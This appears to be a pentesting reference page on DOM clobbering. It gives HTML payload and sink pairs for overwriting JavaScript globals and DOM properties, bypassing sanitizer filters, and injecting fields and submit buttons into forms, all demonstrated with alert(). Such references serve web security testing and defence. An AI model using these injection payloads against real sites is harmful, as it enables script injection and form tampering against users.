# Dom Clobbering
DOM Clobbering is a technique where global variables can be overwritten or "clobbered" by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.

## Basic
It's possible to generate global variables inside the JS context with the attributes `id` and `name` in HTML tags.
```javascript
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```

**Only** certain elements can use the name attribute to **clobber globals**, they are:
* `embed`
* `form`
* `iframe`
* `image`
* `img`
* `object`



## Exploit
Exploitation requires any kind of HTML injection in the page.

* Clobbering `x.y.value`
```javascript
// Payload
<form id=x><output id=y>I've been clobbered</output>

// Sink
<script>alert(x.y.value);</script>
```

* Clobbering `x.y` using ID and name attributes together to form a DOM collection
```javascript
// Payload
<a id=x><a id=x name=y href="Clobbered">

// Sink
<script>alert(x.y)</script>
```
* Clobbering `x.y.z` - 3 levels deep
```javascript
// Payload
<form id=x name=y><input id=z></form>
<form id=x></form>

// Sink
<script>alert(x.y.z)</script>
```

* Clobbering `a.b.c.d` - more than 3 levels
```javascript
// Payload
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//portswigger.net';</style>

// Sink
<script>alert(a.b.c.d)</script>
```

* Clobbering forEach (Chrome only)
```javascipt
// Payload
<form id=x>
<input id=y name=z>
<input id=y>
</form>

// Sink
<script>x.y.forEach(element=>alert(element))</script>
```

* Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same id attribute
```javascript
// Payloads
<html id="cdnDomain">clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>


// Sink 
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```

* Clobbering `x.username`
```javascript
// Payload
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

// Sink
<script>
alert(x.username)//Clobbered-username
alert(x.password)//Clobbered-password
</script>
```

* Clobbering (Firefox only)
```javascript
// Payload
<base href=a:abc><a id=x href="Firefox<>">

// Sink
<script>
alert(x)//Firefox<>
</script>
```

* Clobbering (Chrome only)
```javascript
// Payload
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

// Sink
<script>
alert(x.xyz)//a://Clobbered<>
</script>
```

## Filter Bypassing
If a filter is looping through the properties of a node using something like `document.getElementByID('x').attributes` you could clobber the attribute `.attributes` and break the filter. Other DOM properties like `tagName`, `nodeName` or `parentNode` and more are also clobberable.
```javascript
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```

## Clobbering Forms
It's possible to add new entries inside a form just by specifying the `form` attribute inside some tags. You can use this to add new values inside a form and to even add a new button to send it (clickjacking or abusing some `.click()` JS code):
```javascript
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
* For more form attributes in [W3S](https://www.w3schools.com/tags/tag_button.asp)

## Tools
* [**DOM Invader**](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) is preinstalled in Burp's browser, but is disabled by default as some of its features may interfere with your other testing activities.

















































































